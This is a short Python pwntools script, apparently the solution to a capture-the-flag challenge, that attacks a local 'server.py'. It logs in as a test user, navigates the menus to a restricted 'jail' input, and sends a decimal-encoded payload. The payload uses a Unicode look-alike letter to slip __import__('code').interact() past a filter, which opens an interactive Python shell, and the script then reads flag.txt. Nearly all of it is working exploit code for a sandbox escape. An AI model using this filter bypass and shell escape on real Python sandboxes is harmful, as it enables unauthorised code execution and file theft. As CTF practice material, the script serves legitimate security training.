from pwn import *

#local
p = process(['python3', 'server.py'])
# remote 
# p = remote("HOST", PORT)

final_payload = "__impoʳt__('code').inteʳact()"
final_payload_dec = ''.join(f"{ord(c):03d}" for c in final_payload)

p.sendlineafter(b"Login", b"1")
p.sendlineafter(b"LoginID", b"bob")
p.sendlineafter(b"Password", b"123")
print("Logged in as Bob")
p.sendlineafter(b">", b"1")
p.sendlineafter(b"good luck!", b"q")
p.sendlineafter(b">", b"1")
p.sendlineafter(b">", b"2")
p.sendlineafter(b">", b"2")
print("Triggered jail function")
p.sendlineafter(b"Take your shot", final_payload_dec.encode())
print("Sent payload!")
flag_read = b"with open('flag.txt', 'r') as file: print(file.read())"
p.sendlineafter(b">>> ", flag_read)
print("Reading flag...")
# switching to interactive once a wall of garbled text comes out send a newline (enter)
p.interactive()
